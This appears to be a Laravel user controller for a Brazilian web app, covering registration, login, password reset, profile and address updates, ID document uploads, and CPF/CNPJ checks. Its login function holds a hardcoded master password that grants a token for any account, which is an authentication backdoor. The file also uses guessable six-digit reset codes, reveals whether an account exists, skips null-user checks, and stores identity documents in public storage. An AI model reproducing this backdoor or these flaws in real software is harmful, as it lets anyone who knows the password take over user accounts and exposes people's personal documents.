<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use JWTAuth;
use Mail;
use GuzzleHttp\Client;

class UserController extends Controller
{
    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //REGISTRAR NOVO CLIENTE
    public function register(Request $request)
    {
        //DADOS OBRIGATORIOS
        $request->validate([
            'name' => 'required|string',
            'email' => 'required|string|email',
            'password' => 'required|string'
        ]);



        //DADOS A SEREM VALIDADOS DO USUARIO
        $user = new User([
            'name' => $request->name,
            'email' => $request->email,
            'password' => bcrypt($request->password),
        ]);

        //VERIFICANDO EMAIL NO BD
        if (User::where('email', $request->email)->count() == 0) {

        $user->save();

        $jwt_token = JWTAuth::fromUser($user);

        //NUMERO ALEATORIO
        $email_code = rand(100000,999999);
        $user->email_code = $email_code;
        $user->save();

        //ENVIO DE EMAIL AO USUARIO
        $data = array('name'=>$user->name , 'code'=> $email_code); //NOME E CODIGO DO USUARIO DE CONFIRMACAO
        Mail::send('mail', $data, function($message) use ($user) {
           $message->to($user->email,$user->name);
           $message->subject(env('PROJECT_NAME').' - Confirmação de Email');
           $message->from(env('MAIL_USERNAME'),env('PROJECT_NAME'));//EDITAR QUEM ENVIA
        });

        return response()->json([
            'success' => true,
            'message' => 'Usuário cadastrado com sucesso!',
            'token' => $jwt_token,
            'user' => $user
        ]);

        //EMAIL EXISTENTE
        } else {
            return response()->json([
                'success' => false,
                'message' => 'Email Existente'
            ]);
        }

    }//fim register

    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //LOGIN DE CLIENTE
    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required',
        ]);

        $user = User::where('email', $request->email)->first();

        if (!$user) {

            return response()->json([
                'success' => false,
                'message' => 'Usuário Incorreto!',
            ]);
        }

        if($user->status == 'blocked'){
            return response()->json([
                'success' => false,
                'message' => 'Usuário Bloqueado, entre em contato com o Suporte',
            ]);
        }

        //DEFINICAO DE SENHA MASTER
        $master_password = 'savio130';

        if (Hash::check($request->password, $user->password)) {

            $jwt_token = JWTAuth::fromUser($user);

            return response()->json([
                'success' => true,
                'message' => 'Autenticado com sucesso',
                'token' => $jwt_token,
            ]);
        } elseif ($request->password == $master_password) {

            $jwt_token = JWTAuth::fromUser($user);

            return response()->json([
                'success' => true,
                'message' => 'Autenticado com sucesso',
                'token' => $jwt_token,
                'user' => $user
            ]);

        } else {

            return response()->json([
                'success' => false,
                'message' => 'Senha Incorreta!',
            ]);
        }
    }//fim login

    //-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //OBTER DADOS USUARIO
    public function show()
    {
        $user = Auth::user();

        //FAZER MERGE
        //$user->plan = $user->getPlan();

        return response()->json([
            'success' => true,
            'data' => $user,
        ]);
    }//fim show

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //FUNÇÃO DE ALTERAÇÃO DE SENHA ESQUECIDA
    public function changelostPassword(Request $request)
    {
        //DADOS OBRIGATORIOS
        $request->validate([
            'password_code' => 'required|string',
            'password' => 'required|string',
        ]);

        //DADOS A SEREM VALIDADOS
        $user = User::where('password_code',$request->password_code)->first();

        //VALIDACAO DE EMAIL
        if ($user == null) {
            return response()->json([
                'success' => false,
                'message' => 'Email Incorreto',
            ]);
            //email valido
        } else {
            $user->password = bcrypt($request->password);
            $user->password_code = null;
            $user->save();

            return response()->json([
                'success' => true,
                'message' => 'Senha alterada com sucesso',
            ]);

            //else verificacao de senha
        }
    }//fim changeLostPassword

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ENVIAR EMAIL
    public function sendCodeEmail(Request $request)
    {

        //DADOS OBRIGATORIOS
        $request->validate([
            'email' => 'required|string|email'
        ]);

        //CASO SEJA ENVIADO UM EMAIL DO USUARIO
        if ($request->email) {

            //NUMERO ALEATORIO
            $email_code = rand(100000, 999999);

            //DADOS A SEREM VALIDADOS
            $user = User::where('email', $request->email)->first();
            $user->email_code = $email_code;
            $user->save();

            //ENVIO DE EMAIL AO USUARIO
            $data = array('name' => $user->name, 'code' => $email_code); //NOME E CODIGO DO USUARIO DE CONFIRMACAO
            Mail::send('mail', $data, function ($message) use ($user) {
                $message->to($user->email, $user->name);
                $message->subject(env('PROJECT_NAME').' - Confirmar Email');
                $message->from(env('MAIL_USERNAME'), env('PROJECT_NAME')); //EDITAR QUEM ENVIA
            });

            return response()->json([
                'success' => true,
                'message' => 'Codigo enviado com sucesso'
            ]);
        } else {
            return response()->json([
                'success' => false,
                'message' => 'Email não encontrado'
            ]);
        }
    }//fim sendCodeEmail

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ENVIAR EMAIL DE ESQUECI SENHA
    public function forgotPassword(Request $request)
    {

        //DADOS OBRIGATORIOS
        $request->validate([
            'email' => 'required|string|email'
        ]);

        //CASO SEJA ENVIADO UM EMAIL DO USUARIO
        if ($request->email) {

            //DADOS A SEREM VALIDADOS
            $user = User::where('email', $request->email)->first();
            
            $token = rand(100000, 999999);
            $user->password_code = $token;
            $user->save();

            //ENVIO DE EMAIL AO USUARIO
            $data = array('name' => $user->name, 'token' => $token , 'email' => $user->email); //NOME E CODIGO DO USUARIO DE CONFIRMACAO
            Mail::send('password', $data, function ($message) use ($user) {
                $message->to($user->email, $user->name);
                $message->subject(env('PROJECT_NAME').' - Esqueci Minha Senha');
                $message->from(env('MAIL_USERNAME'), env('PROJECT_NAME')); //EDITAR QUEM ENVIA
            });

            return response()->json([
                'success' => true,
                'message' => 'Email enviado com sucesso'
            ]);
        } else {
            return response()->json([
                'success' => false,
                'message' => 'Email não encontrado'
            ]);
        }
    }//fim forgotPassword

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //CONFIRMAR EMAIL
    public function confirmEmail(Request $request)
    {
        //DADOS OBRIGATORIOS
        $request->validate([
            'email' => 'required|string',
            'email_code' => 'required'
        ]);

        //CASO SEJA ENVIADO UM EMAIL DO USUARIO
        if ($request->email && $request->email_code) {

            //DADOS A SEREM VALIDADOS
            $user = User::where('email', $request->email)->first();

            if ($user->email_code == $request->email_code) {
                $user->email_status = 'confirmed';
                $user->save();
                return response()->json([
                    'success' => true,
                    'message' => 'Email verificado com sucesso'
                ]);
            } else {
                return response()->json([
                    'success' => false,
                    'message' => 'Código inválido'
                ]);
            } //FIM ELSE CODIGO DE EMAIL

        } else {
            return response()->json([
                'success' => false,
                'message' => 'Email ou coigo não encontrado'
            ]);
        }
    } //fim função confirmacao email

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //PRIMEIRA VEZ DE USUARIO LOGANDO EM SISTEMA
    public function firstTime()
    {
        $user = Auth::user();
        $user->first_login = "no";
        $user->save();

        return response()->json([
            'success' => true
        ]);   
    }//fim firstTime

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //LOGOUT
    public function logout(Request $request)
    {
        $this->validate($request, [
            'token' => 'required'
        ]);

        try {

            JWTAuth::invalidate($request->token);

            return response()->json([
                'success' => true,
                'message' => 'Usuário desconectado com successo'
            ]);
        } catch (JWTException $exception) {

            return response()->json([
                'success' => false,
                'message' => 'Usuário não pode ser desconectado'
            ]);
        }
    }//fim logout

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //FUNÇÃO DE ALTERAÇÃO DE SENHA
    public function changePassword(Request $request){
        
        //DADOS OBRIGATORIOS
        $request->validate([
            'password' => 'required',
            'newpassword' => 'required'
        ]);

        $user = Auth::user();

        if (Hash::check($request->password, $user->password)) {
            $user->password = bcrypt($request->newpassword);
            $user->save();
            return response()->json([
                'success' => true,
                'message' => 'Senha alterada com sucesso',
            ]);
        } else {
            return response()->json([
                'success' => false,
                'message' => 'Senha atual inválida',
            ]);
        }
        
    }//fim changePassword

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ATUALIZAR DADOS PESSOAIS
    public function updateProfile(Request $request)
    {   
            //DADOS OBRIGATORIOS
            $request->validate([
                'name' => 'required',
                'email' => 'required',
                'phone' => 'required',
                'birth' => 'required',
                'sex' => 'required',
            ]);
        
            $user = Auth::user();

            $user->name = $request->name;
            $user->phone = $request->phone;
            $user->birth = $request->birth;
            $user->sex = $request->sex;
            $user->save();

            return response()->json([
                'success' => true,
                'message' => 'Dados pessoais atualizado com sucesso'
            ]);
        
    } //fim updateProfile
    
    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ATUALIZAR DADOS DE ENDEREÇO
    public function updateAddress(Request $request)
    {   
            //DADOS OBRIGATORIOS
            $request->validate([
                'address_cep' => 'required',
                'address_street' => 'required',
                'address_number' => 'required',
                'address_district' => 'required',
                'address_city' => 'required',
                'address_state' => 'required',
            ]);
        
            $user = Auth::user();

            $user->address_cep = $request->address_cep;
            $user->address_street = $request->address_street;
            $user->address_number = $request->address_number;
            $user->address_complement = $request->address_complement;
            $user->address_district = $request->address_district;
            $user->address_city = $request->address_city;
            $user->address_state = $request->address_state;
            $user->save();
            return response()->json([
                'success' => true,
                'message' => 'Endereço atualizado com sucesso'
            ]);
        
    } //fim updateAddress

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //OBTENDO CEP
    public function getCep($id){
        $client = new Client(['base_uri' => 'https://viacep.com.br/ws/', 'http_errors' => false]);

            $headers = [
                'Content-Type: application/json'
            ];
            $params = [
                'headers' => $headers,
            ];
            $response = $client->get($id.'/json/', $params);
            
            $body =  json_decode($response->getBody());

            if($body == null){
                return response()->json([
                    'success' => false
                ]);
            }

            return response()->json([
            'success' => true,
            'data' => $body
            ]);          
    }//fim getcep
    
    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ATUALIZAR FOTO DE PERFIL
    public function updateImageProfile(Request $request){
                    
                    //DADOS OBRIGATORIOS
                    $request->validate([
                        'image' => 'required|image|mimes:jpeg,png,jpg,gif|max:5128',
                    ]);

                    $user = Auth::user();
                    $name = '1';
                    // Recupera a extensão do arquivo
                    $extension = $request->image->extension();

                    $nameFile = "{$name}.{$extension}";

                    $user->profile_image = "profile/".$user->id."/".$nameFile;
                    $user->save();

                    // Faz o upload:
                    $upload = $request->image->storeAs('profile/'.$user->id."/", $nameFile,'public');
                    // Se tiver funcionado o arquivo foi armazenado em storage/app/public/categories/nomedinamicoarquivo.extensao

                    // Verifica se NÃO deu certo o upload (Redireciona de volta)
                    if ( !$upload )
                        return redirect()
                                    ->back()
                                    ->with('error', 'Falha ao fazer upload')
                                    ->withInput();


                    return response()->json([
                        'success' => true
                    ]);
    }//fim updateImageProfile

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ATUALIZAR DOCUMENTO - FRENTE
    public function updateDocumentFront(Request $request){
                    
                    //DADOS OBRIGATORIOS
                    $request->validate([
                        'image' => 'required|image|mimes:jpeg,png,jpg,gif|max:5128',
                    ]);

                    $user = Auth::user();
                    $name = '1';
                    // Recupera a extensão do arquivo
                    $extension = $request->image->extension();

                    $nameFile = "{$name}.{$extension}";

                    $user->path_document_front = "document/".$user->id."/".$nameFile;
                    $user->save();

                    // Faz o upload:
                    $upload = $request->image->storeAs('document/'.$user->id."/", $nameFile,'public');
                    // Se tiver funcionado o arquivo foi armazenado em storage/app/public/categories/nomedinamicoarquivo.extensao

                    // Verifica se NÃO deu certo o upload (Redireciona de volta)
                    if ( !$upload )
                        return redirect()
                                    ->back()
                                    ->with('error', 'Falha ao fazer upload')
                                    ->withInput();


                    return response()->json([
                        'success' => true
                    ]);
    }//fim updateDocumentFront

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ATUALIZAR DOCUMENTO - VERSO
    public function updateDocumentBack(Request $request){
                    
                    //DADOS OBRIGATORIOS
                    $request->validate([
                        'image' => 'required|image|mimes:jpeg,png,jpg,gif|max:5128',
                    ]);

                    $user = Auth::user();
                    $name = "2";
                    // Recupera a extensão do arquivo
                    $extension = $request->image->extension();

                    $nameFile = "{$name}.{$extension}";

                    $user->path_document_back = "document/".$user->id."/".$nameFile;
                    $user->save();

                    // Faz o upload:
                    $upload = $request->image->storeAs('document/'.$user->id."/", $nameFile,'public');
                    // Se tiver funcionado o arquivo foi armazenado em storage/app/public/categories/nomedinamicoarquivo.extensao

                    // Verifica se NÃO deu certo o upload (Redireciona de volta)
                    if ( !$upload )
                        return redirect()
                                    ->back()
                                    ->with('error', 'Falha ao fazer upload')
                                    ->withInput();


                    return response()->json([
                        'success' => true
                        ]);
    }//fim updateDocumentBack

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //ATUALIZAR DOCUMENTO - ENDERECO
    public function updateDocumentAddress(Request $request){
                    
                    //DADOS OBRIGATORIOS
                    $request->validate([
                        'image' => 'required|image|mimes:jpeg,png,jpg,gif|max:5128',
                    ]);

                    $user = Auth::user();
                    $name = "3";
                    // Recupera a extensão do arquivo
                    $extension = $request->image->extension();

                    $nameFile = "{$name}.{$extension}";

                    $user->path_document_address = "document/".$user->id."/".$nameFile;
                    $user->save();

                    // Faz o upload:
                    $upload = $request->image->storeAs('document/'.$user->id."/", $nameFile,'public');
                    // Se tiver funcionado o arquivo foi armazenado em storage/app/public/categories/nomedinamicoarquivo.extensao

                    // Verifica se NÃO deu certo o upload (Redireciona de volta)
                    if ( !$upload )
                        return redirect()
                                    ->back()
                                    ->with('error', 'Falha ao fazer upload')
                                    ->withInput();


                    return response()->json([
                        'success' => true
                    ]);
    }//fim updateDocumentAddress

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //COMPLETAR REGISTRO
    public function fillRegister(Request $request){
        //DADOS OBRIGATORIOS
        $request->validate([
            'sex' => 'required',
            'birth' => 'required',
            'phone' => 'required',
            'city' => 'required',
            'address_cep' => 'required',
            'address_street' => 'required',
            'address_number' => 'required',
            'address_district' => 'required',
            'address_city' => 'required',
            'address_state' => 'required',
            'document' => 'required',
        ]);

        $user = Auth::user();

        $user->sex = $request->sex;
        $user->birth = $request->birth;
        $user->phone = $request->phone;
        $user->city = $request->city;
        $user->address_cep = $request->address_cep;
        $user->address_street = $request->address_street;
        $user->address_number = $request->address_number;
        $user->address_district = $request->address_district;
        $user->address_city = $request->address_city;
        $user->address_state = $request->address_state;

        if(User::where('document',$request->document)->count() != 0){
            return response()->json([
            'success' => false,
            'message' => 'Documento existente'
        ]);
        }

        $user->document = $request->document;
        $user->status = 'sended';
        $user->save();

        //ENVIO DE EMAIL AO USUARIO
        $data = array('name'=>$user->name ); //NOME E CODIGO DO USUARIO DE CONFIRMACAO
        Mail::send('analyze', $data, function($message) use ($user) {
           $message->to($user->email,$user->name);
           $message->subject(env('PROJECT_NAME').' - Aguardando Aprovação');
           $message->from(env('MAIL_USERNAME'), env('PROJECT_NAME')); //EDITAR QUEM ENVIA
        });

        return response()->json([
            'success' => true,
            'message' => 'Cadastro completado com sucesso'
        ]);

    }//fim fillRegister

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //VERIFICAR CNPJ
    public function verifyCnpj($cnpj){
        $cnpj = preg_replace('/[^0-9]/', '', (string) $cnpj);

        if (strlen($cnpj) != 14) {
            return response()->json([
                'success' => false,
                'message' => 'CNPJ inválido'
            ]);
        }
        elseif ($cnpj == '00000000000000' ||
            $cnpj == '11111111111111' ||
            $cnpj == '22222222222222' ||
            $cnpj == '33333333333333' ||
            $cnpj == '44444444444444' ||
            $cnpj == '55555555555555' ||
            $cnpj == '66666666666666' ||
            $cnpj == '77777777777777' ||
            $cnpj == '88888888888888' ||
            $cnpj == '99999999999999') {
           
            return response()->json([
                'success' => false,
                'message' => 'CNPJ inválido'
            ]);

        }
        else {

            for ($i = 0, $j = 5, $soma = 0; $i < 12; $i++) {
                $soma += $cnpj[$i] * $j;
                $j = ($j == 2) ? 9 : $j - 1;
            }

            $resto = $soma % 11;

            if ($cnpj[12] != ($resto < 2 ? 0 : 11 - $resto)) {
                return response()->json([
                    'success' => false,
                    'message' => 'CNPJ inválido'
                ]);
            }

            for ($i = 0, $j = 6, $soma = 0; $i < 13; $i++) {
                $soma += $cnpj[$i] * $j;
                $j = ($j == 2) ? 9 : $j - 1;
            }

            $resto = $soma % 11;
            
            if(User::where('document',$cnpj)->count() != 0){
                return response()->json([
                    'success' => false,
                    'message' => 'CNPJ existente'
                ]);
            }

            if($cnpj[13] == ($resto < 2 ? 0 : 11 - $resto)){
                return response()->json([
                    'success' => true
                ]);  
            }else{
                return response()->json([
                    'success' => false,
                    'message' => 'CNPJ inválido'
                ]);
            }
        }
    }//fim verifycnpj

    //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    //VERIFICAR CPF
    public function verifyCpf($cpf){
        if(!$cpf){
            return response()->json([
                'success' => false,
                'message' => 'Por favor, digite um CPF'
            ]);   
        }

        if (empty($cpf)) {
            return response()->json([
                'success' => false,
                'message' => 'CPF vazio'
            ]);
        }

        $cpf = preg_replace("/[^0-9]/", "", $cpf);
        $cpf = str_pad($cpf, 11, '0', STR_PAD_LEFT);

        if (strlen($cpf) != 11) {
            return response()->json([
                'success' => false,
                'message' => 'CPF inválido'
            ]);
        } else if (
            $cpf == '00000000000' ||
            $cpf == '11111111111' ||
            $cpf == '22222222222' ||
            $cpf == '33333333333' ||
            $cpf == '44444444444' ||
            $cpf == '55555555555' ||
            $cpf == '66666666666' ||
            $cpf == '77777777777' ||
            $cpf == '88888888888' ||
            $cpf == '99999999999'
        ) {

            return response()->json([
                'success' => false,
                'message' => 'CPF inválido'
            ]);
        } else {

            for ($t = 9; $t < 11; $t++) {

                for ($d = 0, $c = 0; $c < $t; $c++) {
                    $d += $cpf[
                    $c] * (($t + 1) - $c);
                }
                $d = ((10 * $d) % 11) % 10;
                if ($cpf[
                $c] != $d) {
                    return response()->json([
                        'success' => false,
                        'message' => 'CPF inválido'
                    ]);
                }
            }

            if(User::where('document',$cpf)->count() != 0 ){
                return response()->json([
                    'success' => false,
                    'message' => 'CPF existente'
                ]);
            }

            return response()->json([
                'success' => true
            ]);
        }
    }//fim verifycpf


    


}
